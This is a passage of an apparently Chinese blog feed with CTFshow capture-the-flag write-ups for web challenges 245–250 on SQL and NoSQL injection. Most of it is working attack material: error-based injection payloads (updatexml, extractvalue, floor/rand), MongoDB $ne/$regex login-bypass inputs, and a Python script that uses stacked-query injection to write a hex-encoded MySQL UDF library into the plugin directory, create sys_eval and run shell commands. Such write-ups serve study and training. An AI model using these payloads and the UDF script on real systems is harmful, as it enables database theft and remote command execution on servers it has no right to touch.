punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>报错注入的两种形式：</strong></p><pre><code>extractvalue(目标xml文档，xml路径):对XML文档进行查询的函数updatexml(目标xml文档，xml路径，更新的内容):更新xml文档的函数其都是针对xml路径进行的注入</code></pre><p><strong>payload：</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">updatexml:?id=1' or updatexml(1,concat(0x7e,database(),0x7e),1)+--+?id=1' or updatexml(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),1,32),0x7e),1)+--+?id=1' or updatexml(1,concat(0x7e,(select left(flag,32) from ctfshow_flag),0x7e),1)+--+?id=1' or updatexml(1,concat(0x7e,(select right(flag,32) from ctfshow_flag),0x7e),1)+--+extractvalue:?id=1' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))+--+?id=1' or extractvalue(1,concat(0x7e,substr((select group_concat(flag1) from ctfshow_flagsa),20,30),0x7e))+--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web246——floor报错注入"><a href="#web246——floor报错注入" class="headerlink" title="web246——floor报错注入"></a>web246——floor报错注入</h1><p><strong>floor报错注入：</strong>主要利用主键的重复来实现报错</p><pre><code>?id=1&#39; union select 1,count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2))b from information_schema.tables group by b-- -?id=1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1), 0x7e,floor(rand(0)*2))b from information_schema.tables group by b -- -?id=1&#39; union select 1,count(*),concat(0x7e,(select flag2 from ctfshow_flags),0x7e,floor(rand(0)*2))b from information_schema.tables group by b-- -</code></pre><h1 id="web247——双查询错误注入、报错注入"><a href="#web247——双查询错误注入、报错注入" class="headerlink" title="web247——双查询错误注入、报错注入"></a>web247——双查询错误注入、报错注入</h1><p><strong><code>floor()：向下取整</code><br><code>ceil()：向上取整</code><br><code>round()：四舍五入</code></strong></p><p><strong>floor替换成其他取整函数即可</strong></p><pre><code>?id=1&#39; union select 1,count(*),concat((select `flag?` from ctfshow_flagsa ), 0x7e,round(rand(0)*2))b from information_schema.tables group by b -- -</code></pre><h1 id="web248——UDF注入"><a href="#web248——UDF注入" class="headerlink" title="web248——UDF注入"></a>web248——UDF注入</h1><p><strong>udf：用户自定义的函数</strong></p><pre><code>/api/?id=1&#39;; select @@plugin_dir; -- -查出Mysql插件路径：/usr/lib/mariadb/plugin//api/?id=&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;--+引入udf.so文件从而创建函数sys_eval</code></pre><p><strong>exp提权：</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestsbase_url<span class="token operator">=</span><span class="token string">"http://3f801e10-5c58-42bf-a5cf-8a588d3bfe9c.challenge.ctf.show:8080/api/"</span>payload <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>text <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">]</span>udf <span class="token operator">=</span> <span class="token string">"7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">21510</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    end <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">5000</span>    payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>udf<span class="token punctuation">[</span>i<span class="token punctuation">:</span>end<span class="token punctuation">]</span><span class="token punctuation">)</span>p <span class="token operator">=</span> dict<span class="token punctuation">(</span>zip<span class="token punctuation">(</span>text<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> t <span class="token keyword">in</span> text<span class="token punctuation">:</span>    url <span class="token operator">=</span> base_url<span class="token operator">+</span><span class="token string">"?id=';select unhex('{}') into dumpfile '/usr/lib/mariadb/plugin/{}.txt'--+&amp;page=1&amp;limit=10"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#UDF提权一般配合dumpfile 而不是outfile</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>next_url <span class="token operator">=</span> base_url<span class="token operator">+</span><span class="token string">"?id=';select concat(load_file('/usr/lib/mariadb/plugin/a.txt'),load_file('/usr/lib/mariadb/plugin/b.txt'),load_file('/usr/lib/mariadb/plugin/c.txt'),load_file('/usr/lib/mariadb/plugin/d.txt'),load_file('/usr/lib/mariadb/plugin/e.txt')) into dumpfile '/usr/lib/mariadb/plugin/udf.so'-- +&amp;page=1&amp;limit=10"</span> <span class="token comment" spellcheck="true">#将各个txt文件合并到udf.so</span>rn <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>next_url<span class="token punctuation">)</span>uaf_url<span class="token operator">=</span>base_url<span class="token operator">+</span><span class="token string">"?id=';CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';--+"</span><span class="token comment" spellcheck="true">#创建udf函数</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>uaf_url<span class="token punctuation">)</span>nn_url <span class="token operator">=</span> base_url<span class="token operator">+</span><span class="token string">"?id=';select sys_eval('cat /flag.*');-- +&amp;page=1&amp;limit=10"</span><span class="token comment" spellcheck="true">#执行命令并查看</span>rnn <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>nn_url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rnn<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web249——NOSQL注入"><a href="#web249——NOSQL注入" class="headerlink" title="web249——NOSQL注入"></a>web249——NOSQL注入</h1><p>参考文章：<br><a href="http://rui0.cn/archives/609" target="_blank" rel="noopener">NoSQL注入小笔记</a><br><a href="https://www.anquanke.com/post/id/97211" target="_blank" rel="noopener">冷门知识 — NoSQL注入知多少</a></p><p>搜一下<code>Memcache::get</code><br>说传递数组即会返回第一个数组得元素</p><pre><code>/api/?id[]=flag</code></pre><h1 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//sql语句</span>  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$cursor</span> <span class="token operator">=</span> <span class="token variable">$manager</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string">'ctfshow.ctfshow_user'</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回逻辑，无过滤</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cursor</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'登陆成功'</span><span class="token punctuation">;</span>    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="http://rui0.cn/archives/609" target="_blank" rel="noopener">NoSQL注入小笔记</a><br><a href="https://www.anquanke.com/post/id/97211#h2-0" target="_blank" rel="noopener">冷门知识 — NoSQL注入知多少</a><br>MongoDB是NOSQL的一种，介绍一下Mongodb得两个操作符：<br><code>$ne</code>：!= 不等于<br><code>$regex</code>：正则匹配</p><pre class="line-numbers language-php"><code class="language-php">username<span class="token punctuation">[</span><span class="token variable">$ne</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>password<span class="token punctuation">[</span><span class="token variable">$ne</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>username<span class="token punctuation">[</span><span class="token variable">$regex</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">.</span><span class="token operator">&amp;</span>password<span class="token punctuation">[</span><span class="token variable">$regex</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow之web(三)</title>
      <link href="/2021/07/12/ctfshow-zhi-web-san/"/>
      <url>/2021/07/12/ctfshow-zhi-web-san/</url>
      
